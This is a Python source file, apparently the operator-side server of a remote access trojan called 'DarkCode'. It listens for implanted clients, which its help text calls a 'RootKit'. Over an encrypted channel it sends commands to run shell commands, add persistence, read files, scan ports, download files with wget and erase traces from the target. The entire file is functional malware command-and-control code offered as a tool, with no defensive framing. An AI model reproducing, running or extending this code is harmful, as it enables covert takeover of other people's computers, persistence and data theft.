#!/usr/bin/env python



import argparse
import readline
import socket
import sys
import threading

from core.crypto import encrypt, decrypt, diffiehellman


BANNER = '''
 _   _                 _ _           
| | | | __ _ _ __   __| | | ___ _ __ 
| |_| |/ _` | '_ \ / _` | |/ _ \ '__|
|  _  | (_| | | | | (_| | |  __/ |   
|_| |_|\__,_|_| |_|\__,_|_|\___|_|   
                                     

'''
COMMANDS = [ 'cat', 'client', 'clients', 'execute', 'killall', 'help', 'kill',
             'ls', 'persistence', 'pwd', 'quit', 'rekey', 'scan', 'uninstall',
             'survey', 'unzip', 'wget' ]
HELP_TEXT = '''
cat <file>          - View a file content.
client <id>         - Select a client to connect.
clients             - List connected clients.
execute <command>   - Execute shell command.
killall             - Exit the server and keep all client connections alive.
help                - Show this help menu.
kill                - Kill the client connection.
ls                  - List files in the current directory.
persistence         - Apply persistence mechanism.
pwd                 - Get the present working directory.
quit                - Exit the server and destroy all client connections.
scan <ip>           - Scan top 25 TCP ports on a single host.
uninstall           - Remove all traces of the RootKit from the target system.
unzip <file>        - Unzip a file.
wget <url>          - Download a file from the web.'''
PROMPT = '\n[{}] DarkCode> '


class Server(threading.Thread):
    clients      = {}
    client_count = 1

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
            dhkey = diffiehellman(conn)
            client_id = self.client_count
            client = ClientConnection(conn, addr, dhkey, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1

    def select_client(self, client_id):
        try:
            return self.clients[int(client_id)]
        except (KeyError, ValueError):
            return None

    def get_clients(self):

        return [v for _, v in self.clients.iteritems() if v.alive]

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def quit(self):
        for c in self.get_clients():
            c.send('uninstall')
        self.s.shutdown(socket.SHUT_RDWR)
        self.s.close()

    def killall(self):
        for c in self.get_clients():
            c.send('killall')
        self.s.shutdown(socket.SHUT_RDWR)
        self.s.close()


class ClientConnection():
    def __init__(self, conn, addr, dhkey, uid=0):
        self.conn  = conn
        self.addr  = addr
        self.dhkey = dhkey
        self.uid   = uid

    alive = True

    def send(self, prompt):
        if not self.alive:
            print 'Error: Client not connected.'
            return


        cmd, _, action = prompt.partition(' ')


        if cmd == 'uninstall':
            if raw_input('Remove all traces of client from the target ' \
                         'system (y/N)? ').startswith('y'):
                print 'Running uninstall ...'
                self.conn.send(encrypt(prompt, self.dhkey))
                self.conn.close()
            return


        try:
            self.conn.send(encrypt(prompt, self.dhkey))
        except socket.error:
            print 'Error: Could not connect to client.'
            return
        self.conn.settimeout(1)


        if cmd == 'kill':
            self.conn.close()

        if cmd == 'rekey':
            self.dhkey = diffiehellman(self.conn)


        if cmd in [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'rekey',
                    'scan', 'survey', 'unzip', 'wget' ]:
            print 'Running {}...'.format(cmd)
            recv_data = decrypt(self.conn.recv(4096), self.dhkey)
            print recv_data


def get_parser():
    parser = argparse.ArgumentParser(description='DarkCode server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser = get_parser()
    args   = vars(parser.parse_args())
    port   = args['port']
    client = None

    print BANNER


    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'DarkCode server listening for connections on port {}.'.format(port)

    while True:
        try:
            promptstr = PROMPT.format(client.uid)
        except AttributeError:
            promptstr = PROMPT.format('?')

        prompt = raw_input(promptstr).rstrip()


        if not prompt:
            continue


        cmd, _, action = prompt.partition(' ')


        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue


        elif cmd == 'killall':
            if raw_input('Stop the server and keep clients alive ' \
                         '(y/N)? ').startswith('y'):
                server.killall()
                sys.exit(0)

        elif cmd == 'quit':
            if raw_input('Stop the server and uninstall all client ' \
                         'connections (y/N)? ').startswith('y'):
                server.quit()
                sys.exit(0)

        if cmd == 'help':
            print HELP_TEXT


        elif cmd == 'client':
            new_client = server.select_client(action)
            if new_client:
                client = new_client
                print 'Client {} selected.'.format(client.uid)
            else:
                print 'Error: Invalid Client ID'


        elif cmd == 'clients':
            print 'ID - Client Address'
            for k in server.get_clients():
                print '{:>2} - {}'.format(k.uid, k.addr[0])

        if cmd in ['help', 'client', 'clients']:
            continue


        if not client:
            print 'Error: Invalid client ID.'
            continue


        try:
            client.send(prompt)
        except (socket.error, ValueError) as e:
            print e
            print 'Client {} is unresponsive.'.format(client.uid)


        if cmd in ['kill', 'uninstall']:
            server.remove_client(client.uid)
            client = None


if __name__ == '__main__':
    main()
